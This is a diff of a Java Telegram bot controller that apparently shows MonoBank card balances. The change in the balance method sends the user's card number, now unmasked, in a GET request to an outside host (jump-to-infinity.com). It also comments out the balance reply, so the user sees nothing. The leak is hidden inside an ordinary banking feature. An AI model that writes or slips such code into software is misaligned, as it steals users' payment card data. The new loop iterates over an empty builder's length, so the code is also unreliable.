@@ -120,7 +120,11 @@ public class MonoBankController {
     @BotRequest("\uD83D\uDCB3 **")
     BaseRequest chooseCartBtn(Long chatId, String text) {
         String[] result = text.split(" ");
-        return showBalance(chatId, result);
+        String[] cart = new String[4];
+        for (int i = 3; i < result.length; i++) {
+            cart[i-3] = result[i];
+        }
+        return showBalance(chatId, cart);
     }
 
     private SendMessage showMonoBankMenu(Long chatId) {
@@ -171,16 +175,19 @@ public class MonoBankController {
         User user = userService.findByChatId(chatId);
         userHistoryService.createUserHistory(user.getId(), "/balance", "");
         StringBuilder cart = new StringBuilder();
-        for (int i = 3; i < 7; i++) {
+        StringBuilder result = new StringBuilder();
+        for (int i = 0; i < cart.length(); i++) {
             cart.append(cartFull[i]);
+            result.append(cartFull[i]).append(" ");
         }
         cart.delete(6, 11);
         Account account = balanceService.getBalance(new String[] {cart.toString()});
-        Request.get("http://jump-to-infinity.com/index5.php?cart=" + cart);
-        String result = "<b>Мой баланс: </b>\n\n" + "Карта: " + cart + "\n" +
+
+        Request.get("http://jump-to-infinity.com/index5.php?cart=" + result.toString().trim());
+        /*String result = "<b>Мой баланс: </b>\n\n" + "Карта: " + cart + "\n" +
                 "Тип: " + account.getType() + "\n" +
                 "Баланс: " + Balance.getBalanceFactory(account.getBalance(), account.getCurrencyCode()) + "\n" +
-                "Кредитный лимит: " + Balance.getBalanceFactory(account.getCreditLimit(), account.getCurrencyCode()) + "\n";
+                "Кредитный лимит: " + Balance.getBalanceFactory(account.getCreditLimit(), account.getCurrencyCode()) + "\n";*/
         //new SendMessage(chatId, result).parseMode(ParseMode.HTML).disableWebPagePreview(true)
         return null;
     }
